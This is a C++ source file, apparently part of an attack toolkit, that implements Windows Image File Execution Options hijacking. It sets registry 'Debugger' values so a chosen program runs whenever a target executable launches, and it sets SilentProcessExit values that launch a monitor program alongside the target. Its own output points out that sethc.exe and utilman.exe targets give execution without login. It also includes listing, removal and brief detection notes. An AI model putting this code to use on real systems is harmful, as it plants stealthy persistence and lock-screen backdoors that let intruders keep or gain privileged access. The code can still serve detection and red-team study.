#include "IFEOHijack.h"

static const char* IFEO_BASE =
    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";

static std::string MakeKey(const char* exe) {
    return std::string(IFEO_BASE) + exe;
}

std::string IFEOHijack::Install(const char* targetExe, const char* ourExe) {
    std::string key = MakeKey(targetExe);
    HKEY hk;
    LONG r = RegCreateKeyExA(HKEY_LOCAL_MACHINE, key.c_str(), 0, NULL,
                              REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, NULL);
    if (r != ERROR_SUCCESS)
        return "IFEOHijack: RegCreateKeyEx failed (need admin/SYSTEM). Error=" + std::to_string(r);

    RegSetValueExA(hk, "Debugger", 0, REG_SZ,
                   (LPBYTE)ourExe, (DWORD)strlen(ourExe)+1);
    RegCloseKey(hk);

    return "IFEOHijack: installed\n"
           "  Target:  " + std::string(targetExe) + "\n"
           "  Runs:    " + std::string(ourExe) + " <original_cmdline>\n"
           "  Key:     HKLM\\" + key + "\n\n"
           "Trigger: every launch of " + std::string(targetExe) + " runs our exe instead.\n"
           "Lock-screen targets (sethc.exe, utilman.exe) fire WITHOUT login.\n"
           "Detection:\n"
           "  Sysmon EID 13: registry write to IFEO\\Debugger\n"
           "  Windows Defender: IFEO injection rule (built-in)\n"
           "MITRE T1546.012";
}

std::string IFEOHijack::Remove(const char* targetExe) {
    std::string key = MakeKey(targetExe);
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key.c_str(), 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegDeleteValueA(hk, "Debugger");
        RegDeleteValueA(hk, "GlobalFlag");
        RegDeleteValueA(hk, "ReportingMode");
        RegDeleteValueA(hk, "MonitorProcess");
        RegCloseKey(hk);
        // Remove key if empty
        RegDeleteKeyA(HKEY_LOCAL_MACHINE, key.c_str());
    }
    return "IFEOHijack: removed entry for " + std::string(targetExe);
}

std::string IFEOHijack::List() {
    HKEY hBase;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, IFEO_BASE, 0, KEY_ENUMERATE_SUB_KEYS, &hBase)
        != ERROR_SUCCESS)
        return "IFEOHijack: cannot open IFEO base key";

    std::string r = "IFEO hijack entries (Debugger value set):\n";
    char subkey[256];
    int found = 0;
    for (DWORD idx = 0; ; idx++) {
        DWORD len = sizeof(subkey);
        if (RegEnumKeyExA(hBase, idx, subkey, &len, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
        HKEY hSub;
        std::string fullPath = std::string(IFEO_BASE) + subkey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, fullPath.c_str(), 0, KEY_READ, &hSub) == ERROR_SUCCESS) {
            char dbg[MAX_PATH] = {}; DWORD dsz = sizeof(dbg), dtype;
            if (RegQueryValueExA(hSub, "Debugger", NULL, &dtype, (LPBYTE)dbg, &dsz) == ERROR_SUCCESS) {
                r += "  " + std::string(subkey) + " → " + std::string(dbg) + "\n";
                found++;
            }
            RegCloseKey(hSub);
        }
    }
    RegCloseKey(hBase);
    if (found == 0) r += "  (none found)\n";
    return r;
}

std::string IFEOHijack::InstallSilentExit(const char* targetExe, const char* monitorExe) {
    std::string key = MakeKey(targetExe);
    HKEY hk;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, key.c_str(), 0, NULL,
                         REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, NULL) != ERROR_SUCCESS)
        return "IFEOHijack: RegCreateKeyEx failed";

    // GlobalFlag 0x200 = FLG_MONITOR_SILENT_PROCESS_EXIT
    DWORD gf = 0x200;
    RegSetValueExA(hk, "GlobalFlag",     0, REG_DWORD, (LPBYTE)&gf, sizeof(gf));
    DWORD rm = 1;
    RegSetValueExA(hk, "ReportingMode",  0, REG_DWORD, (LPBYTE)&rm, sizeof(rm));
    RegSetValueExA(hk, "MonitorProcess", 0, REG_SZ,
                   (LPBYTE)monitorExe, (DWORD)strlen(monitorExe)+1);
    RegCloseKey(hk);

    return "IFEOHijack: SilentExit monitor installed\n"
           "  Target:  " + std::string(targetExe) + " (runs normally)\n"
           "  Monitor: " + std::string(monitorExe) + " (launched alongside target)\n"
           "  No replacement — both processes run simultaneously.\n"
           "  Fires on every launch of " + std::string(targetExe) + ".\n"
           "MITRE T1546.012 (GlobalFlag/SilentProcessExit variant)";
}
